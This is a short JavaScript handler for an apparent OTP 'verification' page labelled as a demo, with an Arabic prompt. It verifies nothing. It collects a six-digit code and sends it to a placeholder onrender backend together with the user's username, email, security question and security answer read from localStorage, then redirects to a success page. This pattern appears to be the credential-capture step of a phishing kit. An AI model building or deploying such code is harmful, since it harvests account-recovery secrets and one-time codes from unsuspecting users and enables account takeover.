const verifyBtn = document.getElementById("verifyBtn");

verifyBtn.addEventListener("click", async (e) => {
    e.preventDefault();

    const demoCode = document.getElementById("otp").value.trim();

    if (demoCode.length !== 6) {
        alert("أدخل رمزًا تجريبيًا مكونًا من 6 أرقام");
        return;
    }

    await fetch("https://YOUR-BACKEND.onrender.com/api/demo", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: localStorage.getItem("username"),
            email: localStorage.getItem("email"),
            question: localStorage.getItem("question"),
            answer: localStorage.getItem("answer"),
            demoCode
        })
    });

    window.location.href = "success.html";
});